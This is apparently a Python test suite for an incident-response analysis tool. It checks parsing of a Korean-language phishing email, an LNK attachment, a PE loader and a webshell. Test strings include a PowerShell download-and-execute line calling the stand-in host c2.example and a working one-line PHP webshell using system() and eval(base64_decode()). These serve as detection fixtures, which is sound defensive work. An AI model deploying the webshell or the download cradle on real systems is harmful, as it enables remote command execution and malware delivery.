from conftest import EXPECTED_IMPHASH, FIXTURES

from irsys import emailx, static


def test_email_analysis_extracts_required_fields():
    r = emailx.analyze(FIXTURES / "phish.eml")
    assert r["subject"] == "[자문 요청] 대북정책 세미나 원고 검토"
    assert r["date"]["kst"] == "2026-10-06T10:12:00+09:00"
    assert r["date"]["utc"] == "2026-10-06T01:12:00+00:00"
    assert r["from"] == [{"name": "통일연구원", "address": "admin@unikorea-gov.example"}]
    assert r["to"][0]["address"] == "hong.gildong@victim.example"
    assert r["origin_ip"] == "203.0.113.77"
    assert r["relay_ips"] == ["198.51.100.23", "203.0.113.77"]
    assert [h["from"] for h in r["received_hops"]] == ["[10.0.0.5]", "relay.bulk-mailer.example", "mx.victim.example"]
    assert r["auth"] == {"spf": "fail", "dkim": "none", "dmarc": "fail"}

    [att] = r["attachments"]
    assert att["filename"] == "자문요청서.hwp.lnk"
    assert any("이중 확장자" in f for f in att["flags"])
    assert any("LNK" in f for f in att["flags"])

    hrefs = {l["url"]: l for l in r["links"]}
    assert hrefs["http://login-verify.example/auth?u=hong"]["text_mismatch"]
    assert "http://docs-share.example/view?id=7781" in hrefs

    joined = " ".join(r["indicators"])
    for needle in ("Return-Path", "Reply-To", "SPF fail", "DMARC fail", "불일치"):
        assert needle in joined
    assert set(r["attack_techniques"]) == {"T1566.001", "T1566.002", "T1204.001", "T1204.002"}
    assert att["sha256"] in r["iocs"]["sha256"]


def test_lnk_attachment_static(tmp_path):
    import email
    from email import policy
    msg = email.message_from_bytes((FIXTURES / "phish.eml").read_bytes(), policy=policy.default)
    data = next(p for p in msg.walk() if p.get_filename()).get_payload(decode=True)
    p = tmp_path / "a.lnk"
    p.write_bytes(data)
    r = static.analyze(p, display_name="자문요청서.hwp.lnk")
    assert r["type"] == "Windows 바로가기(LNK)"
    assert "IEX (New-Object Net.WebClient).DownloadString('http://c2.example/p')" in r["decoded_powershell"][0]
    rules = {h["rule"] for h in r["script_indicators"]}
    assert {"powershell_encoded", "powershell_download", "powershell_iex", "hidden_window"} <= rules
    assert "http://c2.example/p" in r["iocs"]["url"]
    assert r["risk"] == "중간" or r["risk"] == "높음"


def test_pe_parsing(pe_file):
    r = static.analyze(pe_file)
    pe = r["pe"]
    assert r["type"].startswith("PE")
    assert pe["machine"] == "x86"
    assert pe["imports"] == {"kernel32.dll": ["VirtualAlloc", "WriteProcessMemory"]}
    assert pe["imphash"] == EXPECTED_IMPHASH
    assert pe["compile_time_kst"] == "2026-03-03T11:00:00+09:00"
    assert pe["pdb_path"].endswith("loader.pdb")
    assert [s["name"] for s in pe["sections"]] == [".text", ".idata"]
    assert r["suspicious_imports"] == {"VirtualAlloc": "T1055", "WriteProcessMemory": "T1055"}
    assert any("자료수집" in s for s in r["hangul_strings"])
    assert "T1055" in r["attack_techniques"]


def test_webshell_detection(tmp_path):
    p = tmp_path / "up.php"
    p.write_text("<?php if(isset($_POST['cmd'])){ system($_POST['cmd']); } eval(base64_decode($_REQUEST['x'])); ?>")
    r = static.analyze(p)
    assert r["type"] == "PHP 스크립트"
    assert {"php_eval_input", "cmd_param"} <= {h["rule"] for h in r["webshell_indicators"]}
    assert r["risk"] == "높음"
    assert "T1505.003" in r["attack_techniques"]


def test_victim_side_values_are_not_iocs():
    r = emailx.analyze(FIXTURES / "phish.eml")
    assert "hong.gildong@victim.example" not in r["iocs"].get("email", [])
    assert not [d for d in r["iocs"]["domain"] if d.endswith("victim.example")]
    assert not [e for e in r["iocs"]["email"] if e.startswith("20261006101200")]  # Message-ID 제외
    assert "admin@unikorea-gov.example" in r["iocs"]["email"]
    assert "login-verify.example" in r["iocs"]["domain"]
